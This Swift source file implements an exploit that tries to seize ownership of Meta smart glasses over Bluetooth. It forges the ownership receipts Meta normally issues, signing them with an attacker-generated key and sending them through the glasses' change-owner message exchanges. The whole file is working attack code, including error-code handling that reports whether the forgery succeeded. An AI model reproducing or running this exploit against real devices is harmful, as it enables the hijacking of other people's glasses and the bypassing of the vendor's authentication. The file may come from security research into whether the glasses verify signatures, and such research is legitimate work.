import Foundation
import CryptoKit

/// Attempts to claim ownership of the glasses by forging Meta's ownership receipts.
///
/// The change-owner protocol (svc36) has four exchanges around Meta's pair_request / pair
/// endpoints.  The CRITICAL open question from the visor protocol docs: "Whether the glasses
/// verify the receipt signatures."  If they don't, we can forge receipts with our own key
/// and become the owner without Meta.
///
/// Receipt wire format (from visor Provision.kt):
///   protobuf { 1: signature_bytes, 2: json_body_bytes }
///
/// NOT thread-safe: call from bleQueue only, same as AirShieldLink.
final class OwnershipForger {

    enum Phase: String {
        case idle               = "Idle"
        case waitingForIdentity = "Waiting for identity"
        case waitingForNonce    = "Waiting for nonce"
        case waitingForDevice   = "Sent forged receipt..."
        case waitingForAck      = "Sent final receipt..."
        case succeeded          = "OWNERSHIP CLAIMED"
        case failed             = "Failed"
    }

    private enum MsgType {
        static let identityRequest        = 0x3000
        static let identityResponse       = 0x3001
        static let skipChallenge          = 0x2000
        static let skipChallengeAck       = 0x2001
        static let startChangeOwnerReq    = 0x2002
        static let startChangeOwnerResp   = 0x2003
        static let finishChangeOwnerReq   = 0x2004
        static let finishChangeOwnerResp  = 0x2005
    }

    private(set) var phase: Phase = .idle
    private(set) var failureReason: String = ""

    var log: ((String) -> Void)?

    // The P-256 key we're trying to register as the glasses' owner.
    private let ownerKey = P256.Signing.PrivateKey()

    private var channelID = 0
    private var deviceCert: [UInt8] = []
    private var serialNumber = ""
    private var secondaryCert: [UInt8] = []
    private var nonce: [UInt8] = []

    var keyHash: [UInt8] {
        AirShieldCrypto.sha256(Array(ownerKey.publicKey.rawRepresentation))
    }

    var publicKey64: [UInt8] {
        Array(ownerKey.publicKey.rawRepresentation)
    }

    // MARK: - Start

    func start(link: AirShieldLink) {
        channelID = link.openChannel()
        phase = .waitingForIdentity
        emit("=== OWNERSHIP FORGERY STARTING ===")
        emit("Owner key hash: \(hex(keyHash))")
        emit("Sending IDENTITY_REQUEST (0x3000)")

        link.sendMessage(
            channelID: channelID,
            serviceID: AirShieldLink.serviceIdentity,
            messageType: MsgType.identityRequest,
            payload: []
        )
    }

    // MARK: - Message handler

    func handleMessage(_ message: AirShieldMessage, link: AirShieldLink) {
        let type = message.header.messageType

        if message.header.hasError {
            let code = String(format: "0x%04x", message.header.errorID)
            let typeName = String(format: "0x%04x", type)
            emit("REJECTED: error \(code) on type \(typeName)")

            switch message.header.errorID {
            case 0x1040: emit("→ INVALID_RECEIPT: glasses verify receipt signatures. Forgery won't work.")
            case 0x1042: emit("→ INVALID_USER_ID: glasses belong to another Meta account")
            case 0x1010: emit("→ KEY_NOT_FOUND")
            case 0x1043: emit("→ INVALID_APP_IDENTITY")
            case 0x1044: emit("→ INVALID_SIGNATURE: glasses verify the signature")
            default:     emit("→ Unknown error code \(code)")
            }
            failureReason = "Error \(code)"
            phase = .failed
            emit("=== FORGERY FAILED ===")
            return
        }

        switch type {
        case MsgType.identityResponse:       handleIdentity(message.payload, link: link)
        case MsgType.skipChallengeAck:       handleNonce(message.payload, link: link)
        case MsgType.startChangeOwnerResp:   handleDeviceReceipt(message.payload, link: link)
        case MsgType.finishChangeOwnerResp:  handleFinishAck()
        default:
            emit("Unexpected svc36 type \(String(format: "0x%04x", type))")
        }
    }

    // MARK: - Step handlers

    private func handleIdentity(_ payload: [UInt8], link: AirShieldLink) {
        let fields = ProtoWire.parse(payload)
        deviceCert = fields.bytes(1)
        serialNumber = String(decoding: fields.bytes(2), as: UTF8.self)
        secondaryCert = fields.bytes(5)
        emit("Identity: serial=\"\(serialNumber)\" cert=\(deviceCert.count)B secondary=\(secondaryCert.count)B")

        phase = .waitingForNonce
        emit("Sending SKIP_CHALLENGE (0x2000)")
        link.sendMessage(
            channelID: channelID,
            serviceID: nil,
            messageType: MsgType.skipChallenge,
            payload: []
        )
    }

    private func handleNonce(_ payload: [UInt8], link: AirShieldLink) {
        let fields = ProtoWire.parse(payload)
        nonce = fields.bytes(1)
        emit("Got nonce: \(nonce.count)B — \(hex(nonce))")

        let receipt = buildPendingReceipt()
        emit("Forged pending receipt: \(receipt.count)B")
        emit("Body: \(String(decoding: pendingBody(), as: UTF8.self))")

        phase = .waitingForDevice
        emit("Sending START_CHANGE_OWNER (0x2002) with forged receipt")
        emit("⚠️ THIS IS THE CRITICAL TEST")
        link.sendMessage(
            channelID: channelID,
            serviceID: nil,
            messageType: MsgType.startChangeOwnerReq,
            payload: receipt
        )
    }

    private func handleDeviceReceipt(_ payload: [UInt8], link: AirShieldLink) {
        emit("🎯 GLASSES RETURNED DEVICE RECEIPT (\(payload.count)B)!")
        emit("🎯 THEY ACCEPTED OUR FORGED PENDING RECEIPT!")
        emit("🎯 Glasses do NOT verify Meta's receipt signatures!")

        let finalReceipt = buildFinalReceipt(deviceReceipt: payload)
        emit("Forged final receipt: \(finalReceipt.count)B")

        phase = .waitingForAck
        emit("Sending FINISH_CHANGE_OWNER (0x2004)")
        link.sendMessage(
            channelID: channelID,
            serviceID: nil,
            messageType: MsgType.finishChangeOwnerReq,
            payload: finalReceipt
        )
    }

    private func handleFinishAck() {
        phase = .succeeded
        emit("✅ GOT FINISH ACK (0x2005)!")
        emit("✅ OWNERSHIP TRANSFER COMPLETE!")
        emit("✅ Key hash: \(hex(keyHash))")
        emit("=== FORGERY SUCCEEDED ===")
    }

    // MARK: - Receipt construction

    private func pendingBody() -> [UInt8] {
        let pubkeyB64 = Data(publicKey64).base64EncodedString()
        let nonceB64 = Data(nonce).base64EncodedString()
        let certB64 = Data(deviceCert).base64EncodedString()
        let secondaryB64 = Data(secondaryCert).base64EncodedString()

        let body: [String: Any] = [
            "serial_number": serialNumber,
            "app_pubkey": pubkeyB64,
            "device_nonce": nonceB64,
            "device_cert": certB64,
            "secondary_cert": secondaryB64,
            "pair_protocol_version": "4",
        ]

        return Array(try! JSONSerialization.data(withJSONObject: body, options: [.sortedKeys]))
    }

    private func sign(_ data: [UInt8]) -> [UInt8] {
        do {
            let sig = try ownerKey.signature(for: Data(data))
            return Array(sig.rawRepresentation)
        } catch {
            emit("Signing failed: \(error)")
            return [UInt8](repeating: 0, count: 64)
        }
    }

    private func encodeReceipt(signature: [UInt8], body: [UInt8]) -> [UInt8] {
        ProtoWire.field(1, bytes: signature) + ProtoWire.field(2, bytes: body)
    }

    private func buildPendingReceipt() -> [UInt8] {
        let body = pendingBody()
        return encodeReceipt(signature: sign(body), body: body)
    }

    private func buildFinalReceipt(deviceReceipt: [UInt8]) -> [UInt8] {
        let pubkeyB64 = Data(publicKey64).base64EncodedString()

        let body: [String: Any] = [
            "serial_number": serialNumber,
            "app_pubkey": pubkeyB64,
            "pair_protocol_version": "4",
        ]

        let bodyBytes = Array(try! JSONSerialization.data(withJSONObject: body, options: [.sortedKeys]))
        return encodeReceipt(signature: sign(bodyBytes), body: bodyBytes)
    }

    // MARK: - Helpers

    private func emit(_ message: String) {
        log?("[Forger] \(message)")
    }

    private func hex(_ bytes: [UInt8], limit: Int = 32) -> String {
        let shown = bytes.prefix(limit).map { String(format: "%02x", $0) }.joined()
        return bytes.count > limit ? "\(shown)...(\(bytes.count)B)" : shown
    }
}
